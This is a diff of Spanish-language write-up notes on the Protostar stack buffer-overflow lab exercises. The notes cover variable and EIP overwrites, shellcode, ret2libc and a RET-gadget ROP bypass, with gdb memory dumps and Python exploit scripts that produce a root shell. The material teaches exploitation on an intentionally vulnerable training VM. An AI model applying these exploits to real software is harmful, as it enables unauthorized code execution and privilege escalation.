@@ -1,9 +1,24 @@
 
+### \[Índice]
+
+ - Stack 1 -> [Concepto de Buffer Overflow](#concepto-de-buffer-overflow)
+ - Stack 2 -> [Sobreescribir una varaible](#sobreescribir-una-variable)
+ - Stack 3 -> [Sobreescribir un puntero de instrucción](#sobreescribir-un-puntero-de-instruccion)
+ - Stack 4 -> [Sobreescribir un puntero de instrucción 2](#sobreescribir-un-puntero-de-instruccion-2)
+ - Stack 5 -> [Shellcode Buffer Overflow](#shellcode-bufferoverflow)
+ - Stack 6 -> [Ret2libc](#ret2libc)
+ - Stack 7 -> [Ret2libc y ROP](#ret2libc-y-rop)
+
+
+
+
 
 Fuente -> [LiveOverflow](https://www.youtube.com/c/LiveOverflow/featured)
 
 ---------------------------------------------------------------------------
-# Concepto de Buffer Overflow -> [stack0](https://exploit.education/protostar/stack-zero/)
+# Concepto de Buffer Overflow 
+
+ > [stack0](https://exploit.education/protostar/stack-zero/)
 
 Este binario toma el input del usuario, según el código lo mete en un buffer de 64 bytes con la función gets()
 
@@ -49,8 +64,7 @@ Breakpoint alcanzado !
 0xbffff640:	0x08048529	0x00000001	0xb7fff8f8	0xb7f0186e
 0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x41414141   -> Parece que nuestro input empieza aquí 0xbffff65c (0xbffff650+12)
 0xbffff660:	0x41414141	0x00414141	0xbffff678	0x080482e8
-0xbffff670:	0xb7ff1040	0x08049620	0xbffff6a8	0x08048469
-0xbffff680:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff6a8
+...
 0xbffff690:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000   -> Y aquí está la varaible "modified" de antes (0xbffff69c)
 ```
 Ahora con el desbordamiento.
@@ -62,9 +76,7 @@ Breakpoint alcanzado !
 (gdb) x/24wx $esp
 0xbffff640:	0x08048500	0x00000001	0xb7fff8f8	0xb7f0186e
 0xbffff650:	0xb7fd7ff4	0xb7ec6165	0xbffff668	0x41414141
-0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
+...
 0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141 -> Ahora modified en vez de ser 0 es AAAA por tanto la hemos modificado.
 (gdb) info registers
 eip            0x41414141	0x41414141   
@@ -83,7 +95,9 @@ Como conclusión, si tenemos un trozo de memoria pensado para qel usaurio meta d
 puede sobreescribir otras datos en la memoria y modificar el programa por dentro.
 
 ---------------------------------------------------------------------------
-# Sobreescribir una variable con datos concretos -> [stack1](https://exploit.education/protostar/stack-one/)
+# Sobreescribir una variable 
+
+> [stack1](https://exploit.education/protostar/stack-one/)
 
 Aquí también hay que sobreescribir una variable, pero en vez de que simplemente no sea 0, tiene que valer algo en concreto.
 Nos piden en el código que valga "0x61626364" o sea como los bytes se dan la vuelta es "\x64\x63\x62\x61"
@@ -106,7 +120,7 @@ you have correctly got the variable to the right value
 ```
 
 ---------------------------------------------------------------------------
-# Sobreescribir un puntero de instrucción -> [stack3](https://exploit.education/protostar/stack-one/)
+# Sobreescribir un puntero de instruccion -> [stack3](https://exploit.education/protostar/stack-one/)
 
 Aquí tenemos que modificar el registro "eip" el cual contiene la dirección de la siguiente insutrucción que el programa va a ejecutar. 
 Hay que mandarlo en concreto a la funcion "win"
@@ -126,8 +140,6 @@ AAAA
 Breakpoint alcanzado
 (gdb) i r
 eip            0x8048477	0x8048477 <main+63>
-
-
 [user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64)" | ./stack3
 [user@protostar]-[/opt/protostar/bin]:$ python -c "print('A'*64 + 'B'*4)" | ./stack3
 calling function pointer, jumping to 0x42424242
@@ -138,10 +150,7 @@ Segmentation fault
 (gdb) run < /tmp/pattern
 (gdb) x/40wx $esp
 0xbffff63c:	0x08048477	0x08048560	0x41414141	0xb7fff8f8
-0xbffff64c:	0xb7f0186e	0xb7fd7ff4	0xb7ec6165	0xbffff668
-0xbffff65c:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff66c:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff67c:	0x41414141	0x41414141	0x41414141	0x41414141
+...
 0xbffff68c:	0x41414141	0x41414141	0x41414141	0x41414141
 0xbffff69c:	0x42424242	0x08048400	0x00000000	0xbffff728
 (gdb) x/x $eip -> El eip esta justo despues del buffer en este caso, en "0xbffff69c"
@@ -169,7 +178,7 @@ code flow successfully changed
 ```
 ---------------------------------------------------------------------------
 
-# Sobreescribir un puntero de instrucción 2 -> [stack4](https://exploit.education/protostar/stack-four/)
+# Sobreescribir un puntero de instruccion 2 -> [stack4](https://exploit.education/protostar/stack-four/)
 
 La teoría es la misma que con el caso anterior, solo que este es algo mas realista ya que el eip no esta pegado al final del buffer.
 
@@ -189,8 +198,7 @@ Breakpoint alcazado!
 (gdb) x/40wx $esp
 0xbffff650:	0xbffff660	0xb7ec6165	0xbffff668	0xb7eada75
 0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
+...
 0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
 0xbffff6a0:	0x42424242	0x43434343	0x44444444	0x45454545
 0xbffff6b0:	0x46464646	0x47474747	0xbffff700	0xb7fe1848
@@ -345,6 +353,7 @@ Para este ejercicio se usará la técnica de ret2libc ya que no se puede saltar 
 input path please: bzzzt (0xbffff69c)
 ```
 Para hacer ret2libc se tiene que conseguir estas tres direcciones y pasarselas como input:
+
 > **RET2LIBC:** offset + función(&system) + retorno(&exit) + argumentos("bin/sh") 
 
 Como hemos visto en la seccion de [estructura de un binario](https://github.com/CUCUxii/CUCUxii.github.io/blob/main/Binarios/Estructura%20de%20un%20binario.md) Se le pasa al eip la dirección de la función system que es la que nos interesa ahora, una vez alli, sabemos que
@@ -415,69 +424,10 @@ input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 whoami
 root
 ```
-# Extra ROP programming -> RET
-
-El rop programming significa que nos aprovechamos de instrucciones de ensamblador del propio código para hacer determinadas cosas en el programa.
-Una de ellas es la intrucción **RET**, la cuál hace un *POP EIP*, 
-
-Es decir la última instruccion de la pila la pasa al eip, eliminandose a si misma (POP EIP), pero al ser RET, deja otro *POP EIP* tras de si que afecta a lo que haya despues en la pila. Es decir es como retrasara el salto un lugar, pero asi podemos burlar protecciones de no retorno a la pila como ```if((ret & 0xbf000000) == 0xbf000000)```... Vamos a verlo en acción.
-
-
-```console
-[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
-(gdb) disas getpath
-... Muchas instrucciones :V
-0x080484f8 <getpath+116>:	leave  
-0x080484f9 <getpath+117>:	ret  -> Esta es la instruccion que nos interesa :)
-```
-Tambien se pueden buscar los gadgets asi:
-```console
-[user@protostar]-[/opt/protostar/bin]:$  objdump -d stack6 -M intel | grep "ret"
- 804835f:	c3                   	ret    
- 8048454:	c3                   	ret    
- 8048482:	c3                   	ret    
- 80484f9:	c3                   	ret   # La que hemos usado
-```
-Ahora a armar el exploit.
-
-```python
-import struct
-offset = 80
-padding = "A" * offset
-ret = struct.pack("I",0x080484f9)
-eip = struct.pack("I",0xbffff6a4+8)
-breakpoint = "\xCC" * 90
-print(padding + ret + eip + breakpoint)
-```
-```console
-[user@protostar]-[/opt/protostar/bin]:$ python /tmp/exploit.py > /tmp/pattern
-[user@protostar]-[/opt/protostar/bin]:$ gdb ./stack6
-(gdb) run < /tmp/pattern
-Program received signal SIGTRAP, Trace/breakpoint trap
-(gdb) x/4wx $esp
-0xbffff69c:	0x080484f9	0xbffff6ac	0xcccccccc	0xcccccccc -> COmo hemos dicho el RET, ha pasado al eip la siguiente dirección.
-(gdb) si
-(gdb) x/4wx $esp
-0xbffff6a0:	0xbffff6ac	0xcccccccc	0xcccccccc	0xcccccccc -> Ha saltado a una zona de "c" o breakpoint
-(gdb) c
-Continuing.
-Program received signal SIGTRAP, Trace/breakpoint trap.
-```
-En cambio sin ese RET...
-
-```python
-print(padding + eip + breakpoint)
-```
-```console
-(gdb) run < /tmp/pattern
-Starting program: /opt/protostar/bin/stack6 < /tmp/pattern
-input path please: bzzzt (0xbffff6ac)
-Program exited with code 01.
-```
 
 ---------------------------------------------------------------------------
 
-# ROP + Ret2libc -> [stack7](https://exploit.education/protostar/stack-seven/)
+# ROP y Ret2libc -> [stack7](https://exploit.education/protostar/stack-seven/)
 
 Este ejercicio es identico al anterior, solo cambia ligeramente la parte de no poder retornar a la pila
 
@@ -495,9 +445,9 @@ Si probamos a ejecutar un ret2libc?
 
 ```console
 (gdb) p &system
-$3 = (<text variable, no debug info> *) 0xb7ecffb0 <__libc_system>
+0xb7ecffb0 <__libc_system>
 (gdb) p &exit
-$4 = (<text variable, no debug info> *) 0xb7ec60c0 <*__GI_exit>
+0xb7ec60c0 <*__GI_exit>
 (gdb) info proc map
 0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
 [user@protostar]-[/opt/protostar/bin]:$  strings -atx /lib/libc-2.11.2.so | grep "bin/sh"
@@ -513,11 +463,21 @@ Las direcciones son las mismas que antes y el offset igual asi que usamos el exp
 [user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py;cat) | ./stack7
 input path please: bzzzt (0xb7ecffb0)
 ```
-Resulta ser que la direccion de system empeiza por 0xb algo, asi que nos la chapa. Que hacer? tirar del recurso del RET para retrasar el eip y burlar la medida.
+Resulta ser que la direccion de system empieza por 0xb algo, asi que nos la chapa. Que hacer? tirar del recurso del RET para retrasar el eip y burlar la medida.
 ```console
 (gdb) disas getpath
 0x08048544 <getpath+128>:       ret 
 ```
+ > ROP PROGRAMMING -> El rop programming significa que nos aprovechamos de instrucciones de ensamblador del propio código para hacer determinadas cosas en el programa.
+
+Una de esas instrucciones es **RET**, la cuál hace un *POP EIP*.  
+Es decir en la pila, la direccion de RET la pasa al eip, eliminandola en el acto (POP EIP), pero esa propia *instruccion RET*, deja otro *POP EIP* tras de si, que afecta a lo siguiente que hay en la pila (la direccion real a la que queremos retornar) pasandola al EIP y saltando a ella pues.
+ > \[pila] direccion1(RET), direccion2  ->  EIP=direccion1(no hace nada) ->  EIP=direccion2 (salta aquí)
+
+Es decir retrasara el salto un lugar, con lo que podemos burlar protecciones de no retorno a la pila como ```if((ret & 0xb0000000) == 0xb0000000)```... Vamos a verlo en acción.  
+Hemos obtenido la instruccion RET del codigo desensamblado, pero tambien se peude conseguir con ```console objdump -d stack6 -M intel | grep "ret"```
+Ahora a armar el exploit.
+
 ```python
 import struct
 padding = "A" * 80
@@ -527,7 +487,8 @@ exit = struct.pack("I",0xb7ec60c0)
 bin_sh = struct.pack("I",0xb7fb63bf)
 print(padding + ret + system + exit + bin_sh)
 ```
-Lo unico nuevo es la linea de "ret = struct.pack("I", 0x08048544)"
+Lo unico nuevo que hay respecto al exploit del stack6 es la linea de "ret = struct.pack("I", 0x08048544)"  
+La direecion despues de RET es la de system (a donde queremos saltar), pero esta vez no nos la tumba la medida de proteccion gracias a ese RET.  
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ (python /tmp/exploit.py;cat) | ./stack7
@@ -536,7 +497,6 @@ whoami
 root
 ```
 Con shellcode sería asi, contando con que mi eip es "0xbffff69c"
-
 ```console
 import struct
 padding = "A" * 80
